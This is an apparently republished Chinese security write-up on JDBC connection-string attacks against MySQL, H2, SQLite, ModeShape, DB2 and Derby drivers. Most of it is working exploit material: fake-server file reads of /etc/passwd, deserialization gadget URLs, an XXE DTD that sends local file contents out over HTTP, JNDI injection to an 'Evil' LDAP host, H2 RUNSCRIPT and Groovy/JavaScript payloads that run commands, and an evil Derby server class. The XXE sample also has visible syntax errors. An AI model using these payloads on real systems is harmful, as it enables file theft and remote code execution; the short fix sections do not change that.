## Mysql 任意文件读取

### 条件

  * 需要JDBC连接串可控

### 影响范围

  * mysql client (pwned)

  * php mysqli (pwned，fixed by 7.3.4)

  * php pdo (默认禁用)

  * python MySQLdb (pwned)

  * python mysqlclient (pwned)

  * java JDBC Driver (pwned，部分条件下默认禁用)

  * navicat （pwned)

### 姿势

  1. 读取服务端文件

  2. 结合phar协议ssrf，见开头链接

### Mysql任意文件读取

#### 原理

这个主要是因为`mysql`中的`LOAD DATA INFILE`语法中，这个语法主要是用于读取一个文件的内容并且放到一个表中。

    
    
    load data infile "/data/data.csv" into table TestTable;
    load data local infile "/home/data.csv" into table TestTable;
    

一个是读服务器本地上的文件，另一个是读client客户端的文件。

我们这次要利用的也就是`LOAD DATA LOCAL INFILE`这种形式。

> 正如官方文档中提出的安全风险，“In theory, a patched server could be built that would tell
> the client program to transfer a file of the server’s choosing rather than
> the file named by the client in the LOAD DATA statement.”

以看到，客户端读取哪个文件其实并不是自己说了算的，是服务端说了算的，形象一点的说就是下面这个样子：

  * 客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！

  * 服务端：OK，读取你本地 data.csv 文件并发给我！

  * 客户端：这是文件内容：balabal！

正常情况下，这个流程不会有什么问题，但是如果我们制作了恶意的客户端，并且回复服务端任意一个我们想要获取的文件，那么情况就不一样了。

  * 客户端：hi~ 我将把我的 data.csv 文件给你插入到 test 表中！

  * 服务端：OK，读取你本地的 / etc/passwd 文件并发给我！

  * 客户端：这是文件内容：balabal（/etc/passwd 文件的内容）！

#### 利用

伪造一个 MySQL 的服务端，甚至不需要实现 MySQL 的任何功能（除了向客户端回复 greeting
package），当有客户端连接上这个假服务端的时候，我们就可以任意读取客户端的一个文件，当然前提是运行客户端的用户具有读取该文件的权限

使用[工具](tools/MySQL_Fake_Server)搭建恶意Mysql服务

通过`?user=`选中需要读取的文件

    
    
    public class Test {
        public static void main(String[] args) throws ClassNotFoundException, SQLException {
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_E:/tools.md&maxAllowedPacket=655360";
            Connection con = DriverManager.getConnection(url);
        }
    }
    

在`mysql-connector-java
5.1.x`版本需要加上`maxAllowedPacket=655360`选项，否则报`java.lang.NegativeArraySizeException`错误

### 使用场景

1.配合网站的重装漏洞进行利用读取服务器的任意文件。

2.数据迁移等需要连接外部数据的功能点

3.搭建在蜜罐上读取攻击者的信息。

### 修复

  1. 使用SSL建立可信连接

    
    
    jdbc:mysql://myDatabaseInfo:3306/DB_NAME?useSSL=true&trustCertificateKeyStoreUrl=path\to\truststore&trustCertificateKeyStorePassword=myPassword
    

  2. 在配置文件中禁用`LOAD`读取文件

### POC

    
    
    Class.forName("com.mysql.jdbc.Driver");
    String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_E:/tools.md&maxAllowedPacket=655360";
    Connection con = DriverManager.getConnection(url);
    

### 使用场景

1.配合网站的重装漏洞进行利用读取服务器的任意文件。

2.数据迁移等需要连接外部数据的功能点

3.搭建在蜜罐上读取攻击者的信息。

## allowUrlInLocalInfile的使用

### 条件

  * JDBC连接可控

  * 开启`allowUrlInLocalInfile`, 默认关闭

### 作用

能够使用URL类支持的所有协议，进行SSRF获取file协议读取本地文件

### 原理

在`mysql-connector-java`包中存在一个`sendFileToServer`方法

> 当然，这个方法在不同的版本所处的包位置不同，我这里是使用的`5.1.48`版本

在 3.0.3版本开始存在 参见官方文档：[MySQL :: MySQL Connector/J 8.0 Developer Guide :: 6.3.5
Security](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-connp-props-security.html)

![image-20220802144401213.png](https://image.3001.net/images/20220808/1659928467_62f07f93f26c7abe12b79.png!small)

在这里将会判断是否开始了选项，如果开启了就会进入`else`语句中，首先会判断是否存在`:`之后才会将其作为URL类构造函数的参数，后面进行请求

### 使用http协议

使用[工具](tools/MySQL_Fake_Server)搭建mysql服务

之后开启`8888`端口的监听

    
    
    //test.java
    public class Test {
        public static void main(String[] args) throws ClassNotFoundException, SQLException {
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_http://127.0.0.1:8888/&maxAllowedPacket=655360&allowUrlInLocalInfile=true";
            Connection con = DriverManager.getConnection(url);
        }
    }
    

![image-20220802142831276.png](https://image.3001.net/images/20220808/1659928489_62f07fa98aa55a0863a82.png!small)

成功请求，说明可以获得回显的内容

### 使用file协议

#### 读取内网文件

    
    
    public class Test {
        public static void main(String[] args) throws ClassNotFoundException, SQLException {
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///etc/passwd&maxAllowedPacket=655360&allowUrlInLocalInfile=true";
            Connection con = DriverManager.getConnection(url);
        }
    }
    

#### 列目录

    
    
    public class Test {
        public static void main(String[] args) throws ClassNotFoundException, SQLException {
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///.&maxAllowedPacket=655360&allowUrlInLocalInfile=true";
            Connection con = DriverManager.getConnection(url);
        }
    }
    

### 使用jar协议

    
    
    jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///test.jar!/META-INF/MANIFEST.MF&maxAllowedPacket=655360&allowUrlInLocalInfile=true
    

### 修复

使用属性进行覆盖

    
    
    public class Test {
        public static void main(String[] args) throws ClassNotFoundException, SQLException {
            Class.forName("com.mysql.jdbc.Driver");
            String url = "jdbc:mysql://127.0.0.1:3306/test?user=fileread_E:/tools.md&maxAllowedPacket=655360&allowUrlInLocalInfile=true";
            Properties properties = new Properties();
            properties.setProperty("allowLoadLocalInfile","false");
    //        properties.setProperty("allowUrlInLocalInfile", "false");
            Connection con = DriverManager.getConnection(url, properties);
        }
    }
    
    
    
    jdbc:mysql://127.0.0.1:3306/test?user=fileread_file:///E:/tools.md&maxAllowedPacket=655360&allowUrlInLocalInfile=true
    

## Mysql客户端反序列化

同样可以使用[Quick Start · alibaba/cobar Wiki
(github.com)](https://github.com/alibaba/cobar)j进行代理，在`com.alibaba.cobar.server.ServerConnection#execute`中添加代码

    
    
    if (sql.equals("SHOW xx")) {
        sql = "select * from evil";
    }
    

进行序列化字符串的获取

### 条件

  * JDBC连接串可控

### 原理

#### POC

    
    
    String url = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections4_calc";
    

#### 关键属性

>
> **queryInterceptors:**一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的Class），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）
>
>  **statementInterceptors**
> :和上面的拦截器作用一致，实现了com.mysql.jdbc.StatementInterceptor接口的Class
>
>
> 到底应该使用哪一个属性，我们可以在对应版本的`com.mysql.jdbc.ConnectionPropertiesImpl`类中搜索，如果存在，就是存在的那个属性
>
> **autoDeserialize:**自动检测与反序列化存在BLOB字段中的对象。

#### getObject方法的寻找

我们可以关注到`mysql-connnector-java-xxx.jar`包中存在有`ResultSetImpl.getObject()`方法

当然，同样的，在不同的版本下的位置不同，我这里使用的`5.1.48`版本，他的位置在`com.mysql.jdbc.ResultSetImpl`类中

![image-20220802195657430.png](https://image.3001.net/images/20220808/1659928646_62f08046b8ecb6fde2409.png!small)

首先他会判断类型，如果是`BIT`类型，就会调用`getObjectDeserializingIfNeeded`方法，跟进

![image-20220802195901681.png](https://image.3001.net/images/20220808/1659928653_62f0804d146ca3188968a.png!small)

之后他首先会判断`field`是否是`Binary`或者`Blob`

> BLOB (binary large
> object)，二进制大对象，是一个可以存储二进制文件的容器。在计算机中，BLOB常常是数据库中用来存储二进制文件的字段类型

之后取出对应的字节数，并且判断是否开启了`autoDeserialize`,
如果开启了，将会进入if语句继续判断前两个字节是否为`-84``-19`这是序列化字符串的标志，hex分别为`AC ED`,
如果满足条件，就会调用对应的`readObject`方法进行反序列化

所以不难发现，如果我们能够控制需要反序列化的数据，就能够进行反序列化漏洞的利用

#### ServerStatusDiffInterceptor拦截器的妙用

我们可以关注到`com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor`这个类，在其中的`populateMapWithSessionStatusValues`方法中，会调用`Util.resultSetToMap(toPopulate,
rs);`方法，进而调用了`java.sql.ResultSet.getObject`方法，形成利用链

    
    
    //populateMapWithSessionStatusValues
    private void populateMapWithSessionStatusValues(Connection connection, Map<String, String> toPopulate) throws SQLException {
        java.sql.Statement stmt = null;
        java.sql.ResultSet rs = null;
    
        try {
            toPopulate.clear();
    
            stmt = connection.createStatement();
            rs = stmt.executeQuery("SHOW SESSION STATUS");
            Util.resultSetToMap(toPopulate, rs); //调用getObject方法
        } finally {
            if (rs != null) {
                rs.close();
            }
    
            if (stmt != null) {
                stmt.close();
            }
        }
    }
    
    
    
    //Util.resultSetToMap
    public static void resultSetToMap(Map mappedValues, java.sql.ResultSet rs) throws SQLException {
        while (rs.next()) {
            mappedValues.put(rs.getObject(1), rs.getObject(2));
        }
    }
    

同样通过idea的`find
Usages`方法找到在`postProcess`方法中调用了`populateMapWithSessionStatusValues`

    
    
    public ResultSetInternalMethods postProcess(String sql, Statement interceptedStatement, ResultSetInternalMethods originalResultSet, Connection connection)
            throws SQLException {
    
        if (connection.versionMeetsMinimum(5, 0, 2)) {
            //调用
            populateMapWithSessionStatusValues(connection, this.postExecuteValues);
    
            connection.getLog().logInfo("Server status change for statement:\n" + Util.calculateDifferences(this.preExecuteValues, this.postExecuteValues));
        }
    
        return null; // we don't actually modify a result set
    
    }
    

同样在`preProcess`方法中也调用了

在调用链中也可以得到

    
    
    populateMapWithSessionStatusValues:61, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)
    preProcess:84, ServerStatusDiffInterceptor (com.mysql.jdbc.interceptors)
    preProcess:54, V1toV2StatementInterceptorAdapter (com.mysql.jdbc)
    preProcess:65, NoSubInterceptorWrapper (com.mysql.jdbc)
    invokeStatementInterceptorsPre:2824, MysqlIO (com.mysql.jdbc)
    sqlQueryDirect:2580, MysqlIO (com.mysql.jdbc)
    execSQL:2465, ConnectionImpl (com.mysql.jdbc)
    execSQL:2439, ConnectionImpl (com.mysql.jdbc)
    executeQuery:1365, StatementImpl (com.mysql.jdbc)
    loadServerVariables:3775, ConnectionImpl (com.mysql.jdbc)
    initializePropsFromServer:3196, ConnectionImpl (com.mysql.jdbc)
    connectOneTryOnly:2233, ConnectionImpl (com.mysql.jdbc)
    createNewIO:2015, ConnectionImpl (com.mysql.jdbc)
    <init>:768, ConnectionImpl (com.mysql.jdbc)
    <init>:47, JDBC4Connection (com.mysql.jdbc)
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
    newInstance:423, Constructor (java.lang.reflect)
    handleNewInstance:425, Util (com.mysql.jdbc)
    getInstance:385, ConnectionImpl (com.mysql.jdbc)
    connect:323, NonRegisteringDriver (com.mysql.jdbc)
    getConnection:664, DriverManager (java.sql)
    getConnection:208, DriverManager (java.sql)
    main:15, Test (pers.xstream)
    

在`com.mysql.jdbc.ConnectImpl#loadServerVariables`方法存在需要执行一段`SHOW
VARIABLES`的sql语句

    
    
    results = stmt.executeQuery(versionComment + "SHOW VARIABLES");
    

因为在这个版本中的`mysql-connector`使用的是`statementInterceptors`作为在执行SQL语句的拦截器类，所以在`com.mysql.jdbc.MysqlIO#sqlQueryDirect`方法中存在对这个属性值是否存在的判断，如果存在，就调用其中的拦截处理逻辑，不存在就直接放行

![image-20220804180057940.png](https://image.3001.net/images/20220808/1659928669_62f0805d3e4beab91e2cc.png!small)

进而调用了对应`Interceptor`的`preProcess`方法，如果我们在JDBC连接串中使用的是`ServerStatusDiffInterceptor`作为拦截器，那么就会调用他的`preProcess`方法，进而形成了利用链

 **注意** ：在`populateMapWithSessionStatusValues`方法中存在一个执行`SHOW SESSION
STATUS`获取结果的逻辑

    
    
    rs = stmt.executeQuery("SHOW SESSION STATUS");
    

我们在恶意Mysql服务端进行处理的时候就可以通过进行`SHOW SESSION
STATUS`或者其他版本的其他标志作为标志，返回我们构造的恶意payload,
使得在后面调用了`UtilresultSetToMap`进行getObject的调用

在`ResultSetImpl#getObject`方法中对mysql服务端返回的数据进行判断，这里是`Types.LONGVARBINARY`类型(长二进制数据),
再然后就是前面提到了`getObject`方法寻找的部分了

#### detectCustomCollations的妙用

在这里我们将环境中的`mysql-connector-java`包改为`5.1.29`版本

来自`chybeta`佬的研究，我们可以关注到`ConnectionImpl#buildCollationMapping`中存在有`Util.resultSetToMap`的调用，能够形成前面所描述的利用链

![image-20220804213617994.png](https://image.3001.net/images/20220808/1659928681_62f08069068e76c3540fe.png!small)

首先看一下调用栈

    
    
    buildCollationMapping:1004, ConnectionImpl (com.mysql.jdbc)
    initializePropsFromServer:3617, ConnectionImpl (com.mysql.jdbc)
    connectOneTryOnly:2550, ConnectionImpl (com.mysql.jdbc)
    createNewIO:2320, ConnectionImpl (com.mysql.jdbc)
    <init>:834, ConnectionImpl (com.mysql.jdbc)
    <init>:46, JDBC4Connection (com.mysql.jdbc)
    newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
    newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
    newInstance:423, Constructor (java.lang.reflect)
    handleNewInstance:411, Util (com.mysql.jdbc)
    getInstance:416, ConnectionImpl (com.mysql.jdbc)
    connect:347, NonRegisteringDriver (com.mysql.jdbc)
    getConnection:664, DriverManager (java.sql)
    getConnection:208, DriverManager (java.sql)
    main:16, Test (pers.xstream)
    

从上面的截图我们可以看到有几个判断条件

  1. 需要满足服务端版本要大于`4.1.0`, 而且`detectCustomCollations`需要为`true`

    
    
    if (versionMeetsMinimum(4, 1, 0) && getDetectCustomCollations())
    

  2. 需要满足大于`5.0.0`，在`5.1.28`不存在这个条件

同样这里获取了执行`SHOW COLLATION`命令的结果集，同样可以作为标志返回恶意payload

只要满足上述条件，就只需要将结果集中的字段 2 或者 3 封装我们的序列化数据就可以成功利用了

### 版本区分

#### ServerStatusDiffInterceptor

  * `5.1.11-6.0.6`使用的是`statementInterceptors`属性，而`8.0`以上使用`queryInterceptors`, 具体属性可以在`ConnectionPropertiesImpl`类中搜索

  * `5.1.11`以下，不能通过这种方式利用，因为在`5.1.10`中`Interceptors`的初始化过程在漏洞利用过程之后，将会在利用中，因为找不到`interceptor`而不能够触发成功  
https://github.com/mysql/mysql-connector-j/compare/5.1.10...5.1.11#diff-4c9979a09004e7c2d55d663702c47c61e002e351856b83cda37414a15fb47dcaL779-L785

![image-20220805202910869.png](https://image.3001.net/images/20220808/1659928706_62f080829d9357d437a95.png!small)

  * `5.0.x`没有这个拦截器

#### detectCustomCollations

  * `8.0.x`不存在getObject方法的调用

  * `6.x`能够利用，因为他在`com.mysql.cj.jdbc.ConnectionImpl`中调用了`ResultSetUtil.resultSetToMap`和上面的功能类似，且没有版本判断

![image-20220806110402451.png](https://image.3001.net/images/20220808/1659928718_62f0808e3fbab8a0013d4.png!small)

  * 从`5.1.29`开始启用`detectCustomCollations`属性，但是直到`5.1.49`做出了更改导致不能使用  
https://github.com/mysql/mysql-connector-j/compare/5.1.48...5.1.49#diff-4c9979a09004e7c2d55d663702c47c61e002e351856b83cda37414a15fb47dcaL911-L914

![image-20220806105901130.png](https://image.3001.net/images/20220808/1659928732_62f0809c76f59545c0366.png!small)

在这里值得注意的是，在`5.1.41`做出了更改，不再调用`Util.resultSetToMap`方法，进而调用getObject方法，改为了直接调用`getObject`方法  
https://github.com/mysql/mysql-connector-j/compare/5.1.40...5.1.41#diff-4c9979a09004e7c2d55d663702c47c61e002e351856b83cda37414a15fb47dcaL944-R936

  * 在`5.1.19 - 5.1.28`过程中，不存在`detectCustomCollations`属性的判断，但是仍然可以调用  
https://github.com/mysql/mysql-connector-j/compare/5.1.28...5.1.29#diff-4c9979a09004e7c2d55d663702c47c61e002e351856b83cda37414a15fb47dcaL986-L1005

  * `5.1.18`以下没有使用`getObject`方法的调用

### 可用连接串

直接对`fnmsd`的研究稍作修改

![image-20220806112310207.png](https://image.3001.net/images/20220808/1659928744_62f080a8c493eb9b4584e.png!small)

将其中5.1.41不可用改成`5.1.29`以上只有`5.1.49`不可用，且`6.x`系列都可以使用

### XXE_attack_analysis

#### 原理

在mysql connector
5.1.48版本中，注册了两个驱动。除了常见的驱动com.mysql.cj.jdbc.Driver之外，就是这个名为com.mysql.fabric.jdbc.FabricMySQLDriver的驱动。

MySQL Fabric 是一个管理 MySQL 服务器场的系统。MySQL Fabric 提供了一个可扩展且易于使用的系统，用于管理 MySQL
部署以实现分片和高可用性。

Litch1研究了FabricMySQLDriver的源码，发现如果连接url以jdbc:mysql:fabric://开头，程序就会进入Fabric流程逻辑。

#### POC

    
    
    from flask import Flask
    app = Flask(__name__) 
    @app.route('/xxe.dtd', methods=['GET', 'POST'])
    def xxe_oob():
    return '''<!ENTITY % aaaa SYSTEM "fiLe:///tmp/data">
    <!ENTITY % demo "<!ENTITY bbbb SYSTEM
    'http://127,0.0.1:5000/xxe?data=%aaaa;'>"> %demo;'''
    @app.route('/', methods=['GET', 'POST’])
    def dtd():
    return '''<?xml version="1.0" encoding="UTF-8" ?>
    <!DOCTYPE ANY [
    <!ENTITY % xd SYSTEM "http://127.0.0.1:5000/xxe.dtd"> %xd;]>
    <root>&ampbbbb</root>'''
    if __name__ == '__main__'
    app.run()
    
    
    
    public static void main(String[] args) throws Exception{
    	String url = "jdbc:mysql:fabric://127.0.0.1:5000";
    	Connection conn = DriverManager.getConnection(url);
    }
    

### 使用场景

#### Weblogic

在Weblogic后台接口中更改JDBC url

  1. anti-attack

  2. decept-defense(HoneyPot for example)

## Other databases

### sqlite

#### 原理

在sqlite与数据库进行连接的时候，会调用`org.sqlite.SQLiteConnection#open`方法（版本不同，类也不同）

![image-20220808101754695.png](https://image.3001.net/images/20220808/1659928888_62f0813847bc1590897c9.png!small)

如果连接的url，是以`:resource:`开头的，之后就会调用`extractResource`方法，并且会将其分隔开来，之后使用URL封装，跟进

![image-20220808102556984.png](https://image.3001.net/images/20220808/1659928895_62f0813f17fa083d7936a.png!small)

之后会读取远程的数据

参考“SELECT code_execution FROM * USING SQLite;”，我们可以利用“CREATE
VIEW”将不可控的SELECT语句转换为可控。

如果我们可以控制 SELECT 语句，我们可以使用 SELECT load_extension('/tmp/test.so') 来加载 dll/so
并执行恶意代码，但在现实世界中，目标系统上存在可控文件并不容易，并且load_extension 默认设置为关闭。

除了常见的漏洞之外，我们还可以使用 SQLite 中的内存损坏（例如“Magellan”）来导致 JVM 崩溃。

#### 依赖

    
    
    <dependency>
        <groupId>org.xerial</groupId>
        <artifactId>sqlite-jdbc</artifactId>
        <version>3.35.0</version>
    </dependency>
    

#### POC

##### 创建database控制Select语句

![image-20220808103351518.png](https://image.3001.net/images/20220808/1659928921_62f081599fa818d9dae1b.png!small)

##### 利用

    
    
    Class.forName("org.sqlite.JDBC");
    Connection connection = DriverManager.getConnection("jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db");
    

### ModeShape

#### 原理

> [ModeShape](https://modeshape.jboss.org/)is an implementation of JCR(Java
> Content Repository),using JCR API to access data from other systems,e.g.
> filesystem, Subversion, JDBC metadata…
>
> Repository source can be configured like
> `jdbc:jcr:jndi:jcr:?repositoryName=repository`.
>
> So of cause we can use ModeShape to trigger JNDI Injection:

#### 依赖

    
    
    <dependency>
        <groupId>org.modeshape</groupId>
        <artifactId>modeshape-jdbc</artifactId>
        <version>5.0.0.Final</version>
    </dependency>
    

#### POC

    
    
    public static void main(String[] args) throws Exception{
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
        DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:9999/Evil");
    }
    

### H2

#### 原理

在`SpringBoot`项目中存在有h2的console接口，可以改变JDBC's url达到攻击的目的

![image-20220807203742659.png](https://image.3001.net/images/20220808/1659929017_62f081b9c5824ae7b5e25.png!small)

#### 条件

需要在配置文件中打开console功能

    
    
    server.port=8000
    spring.h2.console.enabled=true
    spring.h2.console.settings.web-allow-others=true
    

#### 分析

##### RunScript

在poc中的`TRACE_LEVEL_SYSTEM_OUT=3`是定义了输出级别为`DEBUG`级别

我们在`org.h2.engine.Engine#openSession`打下断点，在前面就会分离出`INIT`属性值，得到`RUNSCRIPT FROM
'xxx'`

![image-20220807211458494.png](https://image.3001.net/images/20220808/1659929070_62f081ee3ce95e54b7b52.png!small)

之后会调用`var6.prepareCommand`方法传入参数`var5`，初始化数据库连接

![image-20220807211806683.png](https://image.3001.net/images/20220808/1659929076_62f081f4c15285c1f2c41.png!small)

跟进`prepareCommand`方法，调用了prepareLocal方法，继续跟进，之后会得到一个`CommandContainer`类，之后会调用他的`executeUpdate`方法，之后跟进到了`update`方法中

![image-20220807213239744.png](https://image.3001.net/images/20220808/1659930951_62f08947e2e88b914f920.png!small)

在`update`方法中

![image-20220807213601320.png](https://image.3001.net/images/20220808/1659930958_62f0894edbf4193a96f99.png!small)

首先会在断点处接收远程来的poc.sql

之后在调用`ScriptReader`中得到sql脚本，之后在之后执行`execute`执行命令

为什么要使用 RUNSCRIPT捏？

因为其中的`prepareCommand`只能够支持一条sql语句的执行，所以我们使用命令直接从远程获取执行sql语句脚本

#### 不出网分析

所以我们需要找到一个能够只执行一条sql语句就能达到目的的途径

来自HTB中的议题分享，Litch1查看了语句CREATE ALIAS的创建者的源代码，发现语句中JAVA
METHOD的定义交给了源编译类。支持的编译器有Java/Javascript/Groovy三种，从源代码编译器着手开始

##### Groovy

在`org.h2.util.SourceCompiler#getClass`方法中他会通过`isGroovySource`判断是否是Groovy的源代码，如果是，就会调用`SourceCompiler.GroovyCompiler.parseClass`对源代码进行解析

![image-20220808073349328.png](https://image.3001.net/images/20220808/1659930990_62f0896ea1ae3dde6b4ce.png!small)

进而调用了`groovy.lang.GroovyCodeSource#parseClass`进行解析

![image-20220808073445744.png](https://image.3001.net/images/20220808/1659931001_62f089798cb05ac8644a2.png!small)

在poc中我们使用@AST注解进行断言执行任意代码

    
    
    String groovy = "@groovy.transform.ASTTest(value={" +
            " assert java.lang.Runtime.getRuntime().exec(\"calc\")" +
            "})" +
            "def x";
    String url = "jdbc:h2:mem:dbtest;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
    

在环境中需要存在groovy依赖

    
    
    <dependency>
        <groupId>org.codehaus.groovy</groupId>
        <artifactId>groovy-sql</artifactId>
        <version>3.0.9</version>
    </dependency>
    

![image-20220808080305202.png](https://image.3001.net/images/20220808/1659931012_62f0898452913b1721977.png!small)

##### JavaScript执行

采用JavaScript + CREATE TRIGGER的方式不仅可以编译代码，还可以调用eval方法

同样在`CommandContainer#update`方法中调用了`this.prepared.update()`这里的`prepared`是`CreateTrigger`类

![image-20220808081945813.png](https://image.3001.net/images/20220808/1659931024_62f08990a12908e293b52.png!small)

跟进，在其中获得了对应的table属性，和TriggerObject，之后调用`var4.setTriggerSource`设置源代码

![image-20220808082448537.png](https://image.3001.net/images/20220808/1659931033_62f08999cfe45cf44a4e8.png!small)

跟进，跟着调用了`setTriggerAction`和 `load`方法

![image-20220808082715776.png](https://image.3001.net/images/20220808/1659931054_62f089ae5c554b9947000.png!small)

在load方法中，会判断是否有`triggerClassName`，如果有，就直接加载对应的类并实例化，这里我们选择进入loadFromSource方法，直接从源代码中加载，跟进

![image-20220808082858904.png](https://image.3001.net/images/20220808/1659931074_62f089c23a658e0a467f5.png!small)

在其中，他会判断source是否是javaScript源代码，如果是，就会进行编译，特别的，在编译完成之后他会执行`eval`操作，自然的就达到了命令执行的目的

    
    
    String javaScript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"calc\")";
    String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javaScript +"'";
    

#### POC

##### RunScript

    
    
    jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8888/poc.sql'
    
    
    
    CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);}';CALL EXEC ('calc')
    

##### Groovy

    
    
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("org.h2.Driver");
        String groovy = "@groovy.transform.ASTTest(value={" +
                " assert java.lang.Runtime.getRuntime().exec(\"calc\")" +
                "})" +
                "def x";
        String url = "jdbc:h2:mem:dbtest;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
        Connection connection = DriverManager.getConnection(url);
        connection.close();
    }
    

##### JavaScript

    
    
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("org.h2.Driver");
        String javaScript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"calc\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON INFORMATION_SCHEMA.CATALOGS AS '"+ javaScript +"'";
        Connection connection = DriverManager.getConnection(url);
        connection.close();
    }
    

### DB2

#### 原理

> clientRerouteServerListJNDINameIdentifies a JNDI reference to a
> DB2ClientRerouteServerList instance in a JNDI repository of reroute server
> information.clientRerouteServerListJNDIName applies only to IBM Data Server
> Driver for JDBC and SQLJ type 4 connectivity, and to connections that are
> established through the DataSource interface. If the value of
> clientRerouteServerListJNDIName is not null, clientRerouteServerListJNDIName
> provides the following functions:
>
> • Allows information about reroute servers to persist across JVMs
>
> • Provides an alternate server location if the first connection to the data
> source fails

#### 依赖

    
    
    <dependency>
        <groupId>com.ibm.db2</groupId>
        <artifactId>jcc</artifactId>
        <version>11.5.7.0</version>
    </dependency>
    

#### POC

    
    
    Class.forName("com.ibm.db2.jcc.DB2Driver");
    DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://127.0.0.1:9999/Evil;");
    

### Apache Derby

#### 原理

在`org.apache.derby.impl.store.replication.net.SocketConnection`中进行socket连接中

![image-20220808100348726.png](https://image.3001.net/images/20220808/1659931416_62f08b18308589a9fdc02.png!small)

在`readMessage`方法中调用了输入流的`readObject`方法

之后在`ReplicationMessageTransmit$MasterReceiverThread`类存在`readMessage`方法的调用

![image-20220808100524088.png](https://image.3001.net/images/20220808/1659931423_62f08b1f6154ad3456f14.png!small)

因为`ReplicationMessageTransmit`类是通过配置中的`startMaster=true`和
`slaveHost=127.0.0.2`将数据库从master复制到了slave中去的，所以如果我们可以搭建恶意服务器，然后受害端就会接收获取的数据，之后进行反序列化操作

#### 依赖

    
    
    <dependency>
        <groupId>org.apache.derby</groupId>
        <artifactId>derby</artifactId>
        <version>10.10.1.1</version>
    </dependency>
    <dependency>
        <groupId>commons-beanutils</groupId>
        <artifactId>commons-beanutils</artifactId>
        <version>1.9.4</version>
    </dependency>
    

#### POC

    
    
    public static void main(String[] args) throws Exception{
        Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
        DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=evil_server_ip");
    }
    

`evil server`

    
    
    public class EvilSlaveServer {
        public static void main(String[] args) throws Exception {
            int port = 4851;
            ServerSocket server = new ServerSocket(port);
            Socket socket = server.accept();
            socket.getOutputStream().write(Serializer.serialize(new CommonsBeanutils1().getObject("calc")));
            socket.getOutputStream().flush();
            Thread.sleep(TimeUnit.SECONDS.toMillis(5));
            socket.close();
            server.close();
        }
    }
    

## Reference

[BlackHat Europe 2019 New Exploit Technique In Java Deserialization
Attack](https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf)

